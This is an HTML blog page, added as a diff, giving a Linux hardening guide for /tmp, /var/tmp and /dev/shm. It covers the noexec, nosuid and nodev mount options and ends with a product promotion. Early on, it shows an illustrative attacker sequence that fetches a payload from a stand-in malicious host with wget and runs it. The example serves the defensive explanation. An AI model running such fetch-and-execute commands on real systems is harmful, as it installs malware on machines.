@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>How to Secure /tmp, /var/tmp, and /dev/shm on Linux (2026 Guide)</title>
+  <meta name="description" content="Harden Linux temporary directories against malware and privilege escalation. Learn /etc/fstab mount options nosuid, noexec, nodev, and CIS compliance.">
+  <link rel="canonical" href="https://sshdesktop.com/blog/how-to-secure-tmp-dev-shm-fstab-guide.html">
+  
+  <!-- OpenGraph -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="How to Secure /tmp, /var/tmp, and /dev/shm on Linux (2026 Guide)">
+  <meta property="og:description" content="Harden Linux temporary directories against malware and privilege escalation. Learn /etc/fstab mount options nosuid, noexec, nodev, and CIS compliance.">
+  <meta property="og:url" content="https://sshdesktop.com/blog/how-to-secure-tmp-dev-shm-fstab-guide.html">
+  <meta property="og:image" content="https://sshdesktop.com/assets/images/og-image.png">
+  <meta property="og:site_name" content="SSH Desktop">
+  <meta property="article:published_time" content="2026-11-16T08:00:00+00:00">
+  <meta property="article:modified_time" content="2026-11-16T08:00:00+00:00">
+  
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="How to Secure /tmp, /var/tmp, and /dev/shm on Linux (2026 Guide)">
+  <meta name="twitter:description" content="Harden Linux temporary directories against malware and privilege escalation. Learn /etc/fstab mount options nosuid, noexec, nodev, and CIS compliance.">
+  <meta name="twitter:image" content="https://sshdesktop.com/assets/images/og-image.png">
+
+  <!-- Icons -->
+  <link rel="icon" type="image/svg+xml" href="../assets/images/favicon.svg">
+  <link rel="icon" type="image/png" sizes="32x32" href="../assets/images/favicon-32x32.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="../assets/images/apple-touch-icon.png">
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="../assets/css/style.min.css">
+
+  <!-- JSON-LD Structured Data -->
+  <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "TechArticle",
+      "@id": "https://sshdesktop.com/blog/how-to-secure-tmp-dev-shm-fstab-guide.html#article",
+      "isPartOf": {
+        "@type": "WebPage",
+        "@id": "https://sshdesktop.com/blog/how-to-secure-tmp-dev-shm-fstab-guide.html",
+        "url": "https://sshdesktop.com/blog/how-to-secure-tmp-dev-shm-fstab-guide.html",
+        "name": "How to Secure /tmp, /var/tmp, and /dev/shm on Linux (2026 Guide)",
+        "description": "Harden Linux temporary directories against malware and privilege escalation. Learn /etc/fstab mount options nosuid, noexec, nodev, and CIS compliance."
+      },
+      "headline": "How to Secure /tmp, /var/tmp, and /dev/shm on Linux: 2026 Hardening Guide",
+      "description": "Harden Linux temporary directories against malware and privilege escalation. Learn /etc/fstab mount options nosuid, noexec, nodev, and CIS compliance.",
+      "inLanguage": "en-US",
+      "datePublished": "2026-11-16T08:00:00+00:00",
+      "dateModified": "2026-11-16T08:00:00+00:00",
+      "mainEntityOfPage": "https://sshdesktop.com/blog/how-to-secure-tmp-dev-shm-fstab-guide.html",
+      "author": {
+        "@type": "Organization",
+        "name": "SSH Desktop Team",
+        "url": "https://sshdesktop.com"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "name": "SSH Desktop",
+        "url": "https://sshdesktop.com",
+        "logo": {
+          "@type": "ImageObject",
+          "url": "https://sshdesktop.com/assets/images/favicon.svg"
+        }
+      },
+      "image": {
+        "@type": "ImageObject",
+        "url": "https://sshdesktop.com/assets/images/og-image.png",
+        "width": 1200,
+        "height": 630
+      }
+    },
+    {
+      "@type": "BreadcrumbList",
+      "@id": "https://sshdesktop.com/blog/how-to-secure-tmp-dev-shm-fstab-guide.html#breadcrumb",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://sshdesktop.com/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Blog",
+          "item": "https://sshdesktop.com/blog/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "How to Secure /tmp, /var/tmp, and /dev/shm on Linux (2026 Guide)",
+          "item": "https://sshdesktop.com/blog/how-to-secure-tmp-dev-shm-fstab-guide.html"
+        }
+      ]
+    },
+    {
+      "@type": "FAQPage",
+      "@id": "https://sshdesktop.com/blog/how-to-secure-tmp-dev-shm-fstab-guide.html#faq",
+      "mainEntity": [
+        {
+          "@type": "Question",
+          "name": "Why are /tmp and /dev/shm prime targets for Linux malware and attackers?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Because temporary directories require world-writable permissions (1777 / sticky bit) so any process can create temp files. Attackers exploit this to download malicious payloads or compile root exploits. Restricting execution with noexec prevents binaries and scripts from running directly inside /tmp."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "What do the nosuid, noexec, and nodev mount flags do?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "nosuid disables SetUID and SetGID execution, preventing privilege escalation. noexec prevents execution of any binaries or scripts residing on that partition. nodev blocks the operating system from creating or interpreting block or character special device files."
+          }
+        },
+        {
+          "@type": "Question",
+          "name": "Will mounting /tmp with noexec break package managers like apt or yum/dnf?",
+          "acceptedAnswer": {
+            "@type": "Answer",
+            "text": "Certain package managers execute temporary scripts during upgrades or kernel builds. If an upgrade fails due to noexec, temporarily remount /tmp with execution privileges (sudo mount -o remount,exec /tmp), perform the upgrade, and remount it with noexec."
+          }
+        }
+      ]
+    }
+  ]
+}
+  </script>
+</head>
+<body class="bg-slate-900 text-slate-100 font-sans antialiased">
+  <!-- Navigation Header -->
+  <header class="blog-nav-header">
+    <div class="blog-nav-container">
+      <a href="../index.html" class="blog-nav-logo">
+        <img src="../assets/images/favicon.svg" alt="SSH Desktop Logo" width="32" height="32" class="blog-logo-img">
+        <span>SSH Desktop</span>
+      </a>
+      <nav class="blog-nav-links">
+        <a href="../features.html">Features</a>
+        <a href="../docs/">Docs</a>
+        <a href="index.html" class="active">Blog</a>
+        <a href="../download.html" class="blog-btn-cta">Download App</a>
+      </nav>
+    </div>
+  </header>
+
+  <!-- Main Article Body -->
+  <main class="blog-article-wrapper">
+    <!-- Breadcrumb -->
+    <nav class="blog-breadcrumb" aria-label="Breadcrumb">
+      <ol>
+        <li><a href="../index.html">Home</a></li>
+        <li><a href="index.html">Blog</a></li>
+        <li aria-current="page">How to Secure /tmp, /var/tmp, and /dev/shm on Linux (2026 Guide)</li>
+      </ol>
+    </nav>
+
+    <article class="blog-post-content">
+      <header class="blog-post-header">
+        <div class="blog-post-meta">
+          <span class="blog-post-tag">Security & Hardening</span>
+          <time datetime="2026-11-16">2026-11-16</time>
+          <span>&bull;</span>
+          <span>11 min read</span>
+        </div>
+        <h1 class="blog-post-h1">How to Secure /tmp, /var/tmp, and /dev/shm on Linux: 2026 Hardening Guide</h1>
+      </header>
+
+      <div class="blog-post-body">
+        
+      <p class="blog-lead">
+        Under standard Linux installations, <code>/tmp</code> and <code>/dev/shm</code> (shared memory) are world-writable directories accessible to every system user and daemon. When web applications (such as WordPress, PHP-FPM, or Python web servers) suffer remote code execution or file upload vulnerabilities, attackers routinely stage reverse shells and rootkits in <code>/tmp</code>. Hardening these partitions with <strong>nosuid</strong>, <strong>noexec</strong>, and <strong>nodev</strong> is a core CIS Benchmark and PCI-DSS compliance requirement.
+      </p>
+
+      <h2>The Dangerous Nature of World-Writable Directories</h2>
+      <p>
+        By design, temporary directories have permissions set to <code>1777</code> (<code>drwxrwxrwt</code>), allowing any local user or unprivileged service account to create and write files. If attackers achieve an arbitrary file upload, their immediate next step is executing a binary payload:
+      </p>
+      <pre><code># Attackers routinely execute binaries directly from /tmp
+cd /tmp
+wget https://malicious-host.xyz/botnet-payload -O agent
+chmod +x agent
+./agent &amp;</code></pre>
+      <p>
+        Mounting <code>/tmp</code> with the <code>noexec</code> flag completely neutralizes this attack vector by blocking kernel syscall execution on any file within the mount point.
+      </p>
+
+      <h2>Step 1: Check Current Mount Status</h2>
+      <p>Inspect existing mount options for temporary filesystems:</p>
+      <pre><code>mount | grep -E "( /tmp | /dev/shm )"
+df -h /tmp /dev/shm</code></pre>
+      <p>
+        If <code>/tmp</code> is merely a directory on the root partition rather than an isolated mount point, you must mount it as a dedicated filesystem or tmpfs.
+      </p>
+
+      <h2>Step 2: Harden /tmp Using systemd or tmpfs</h2>
+      <p>
+        Modern Linux distributions (Ubuntu 22.04+, Debian 12, RHEL 9, Rocky Linux) manage <code>/tmp</code> as a RAM-backed <code>tmpfs</code> via systemd. Enable and secure it:
+      </p>
+      <pre><code># Copy systemd tmp mount template
+sudo cp /usr/share/systemd/tmp.mount /etc/systemd/system/
+sudo systemctl daemon-reload
+sudo systemctl enable --now tmp.mount</code></pre>
+      <p>
+        To enforce strict security flags, edit <code>/etc/systemd/system/tmp.mount</code> or define them in <code>/etc/fstab</code>:
+      </p>
+      <pre><code>sudo nano /etc/fstab</code></pre>
+      <p>Add the hardened <code>/tmp</code> line:</p>
+      <pre><code># Secure /tmp with tmpfs
+tmpfs   /tmp   tmpfs   rw,nosuid,nodev,noexec,relatime,size=2G   0  0</code></pre>
+
+      <h2>Step 3: Secure /var/tmp with Bind Mount</h2>
+      <p>
+        <code>/var/tmp</code> is used for temporary files that persist across reboots. Rather than maintaining a separate partition, bind mount <code>/var/tmp</code> to point to <code>/tmp</code> in <code>/etc/fstab</code>:
+      </p>
+      <pre><code># Bind mount /var/tmp to /tmp to inherit security flags
+/tmp   /var/tmp   none   bind,nosuid,nodev,noexec   0  0</code></pre>
+
+      <h2>Step 4: Harden /dev/shm (Shared Memory)</h2>
+      <p>
+        <code>/dev/shm</code> provides POSIX shared memory. While processes need to read and write shared memory segments, they rarely need to execute compiled binaries directly from it. Update <code>/dev/shm</code> in <code>/etc/fstab</code>:
+      </p>
+      <pre><code># Secure POSIX shared memory
+tmpfs   /dev/shm   tmpfs   rw,nosuid,nodev,noexec   0  0</code></pre>
+
+      <h2>Step 5: Apply Mount Options and Verify Execution Block</h2>
+      <p>Apply the new mounts without rebooting:</p>
+      <pre><code>sudo mount -o remount /tmp
+sudo mount -o remount /dev/shm
+sudo mount -a</code></pre>
+      <p>
+        Verify that execution is strictly forbidden by compiling or running a test script inside <code>/tmp</code>:
+      </p>
+      <pre><code>echo '#!/bin/bash' &gt; /tmp/test-script.sh
+echo 'echo "Execution allowed!"' &gt;&gt; /tmp/test-script.sh
+chmod +x /tmp/test-script.sh
+
+/tmp/test-script.sh</code></pre>
+      <p>Expected secure response from the Linux kernel:</p>
+      <pre><code>-bash: /tmp/test-script.sh: Permission denied</code></pre>
+
+      <h2>Audit Security and Storage Visually with SSH Desktop</h2>
+      <p>
+        Keeping track of partition mounts, filesystem permissions, and rogue background processes across multiple production servers is simple with <strong>SSH Desktop</strong>:
+      </p>
+      <ul>
+        <li><strong>Visual Disk Manager:</strong> Monitor partition usage, mount points, and filesystem flags across all servers in one unified dashboard.</li>
+        <li><strong>Security Auditor:</strong> Automatically verify CIS benchmark compliance, including <code>nosuid</code> and <code>noexec</code> mount flags.</li>
+        <li><strong>Live Process Manager:</strong> Detect and terminate unapproved processes attempting to run from non-standard directories.</li>
+      </ul>
+      <p>
+        Explore our <a href="../linux-disk-manager.html">Linux Disk Manager</a> and <a href="../linux-security-auditor.html">Linux Security Auditor</a>.
+      </p>
+    
+
+        <h2>Frequently Asked Questions</h2>
+        <div class="faq-accordion">
+          
+        <div class="faq-item">
+          <h3 class="faq-question">Why are /tmp and /dev/shm prime targets for Linux malware and attackers?</h3>
+          <p class="faq-answer">Because temporary directories require world-writable permissions (1777 / sticky bit) so any process can create temp files. Attackers exploit this to download malicious payloads or compile root exploits. Restricting execution with noexec prevents binaries and scripts from running directly inside /tmp.</p>
+        </div>
+        <div class="faq-item">
+          <h3 class="faq-question">What do the nosuid, noexec, and nodev mount flags do?</h3>
+          <p class="faq-answer">nosuid disables SetUID and SetGID execution, preventing privilege escalation. noexec prevents execution of any binaries or scripts residing on that partition. nodev blocks the operating system from creating or interpreting block or character special device files.</p>
+        </div>
+        <div class="faq-item">
+          <h3 class="faq-question">Will mounting /tmp with noexec break package managers like apt or yum/dnf?</h3>
+          <p class="faq-answer">Certain package managers execute temporary scripts during upgrades or kernel builds. If an upgrade fails due to noexec, temporarily remount /tmp with execution privileges (sudo mount -o remount,exec /tmp), perform the upgrade, and remount it with noexec.</p>
+        </div>
+        </div>
+
+        <!-- Conversion Card -->
+        <div class="blog-cta-box">
+          <h3>Manage Linux Servers with Visual Simplicity</h3>
+          <p>
+            Tired of juggling terminal windows and typing repetitive commands? SSH Desktop combines an ultra-fast terminal with native SFTP, background tunnels, visual reverse proxy management, and real-time system monitoring.
+          </p>
+          <a href="../download.html" class="blog-cta-button">Download SSH Desktop Free &rarr;</a>
+        </div>
+      </div>
+    </article>
+  </main>
+
+  <!-- Footer -->
+  <footer class="blog-footer">
+    <div class="blog-footer-container">
+      <p>&copy; 2026 SSH Desktop. All rights reserved. Free, open, and privacy-focused Linux management.</p>
+      <div class="blog-footer-links">
+        <a href="../privacy.html">Privacy Policy</a>
+        <a href="../terms.html">Terms of Service</a>
+        <a href="../contact.html">Contact Us</a>
+      </div>
+    </div>
+  </footer>
+</body>
+</html>
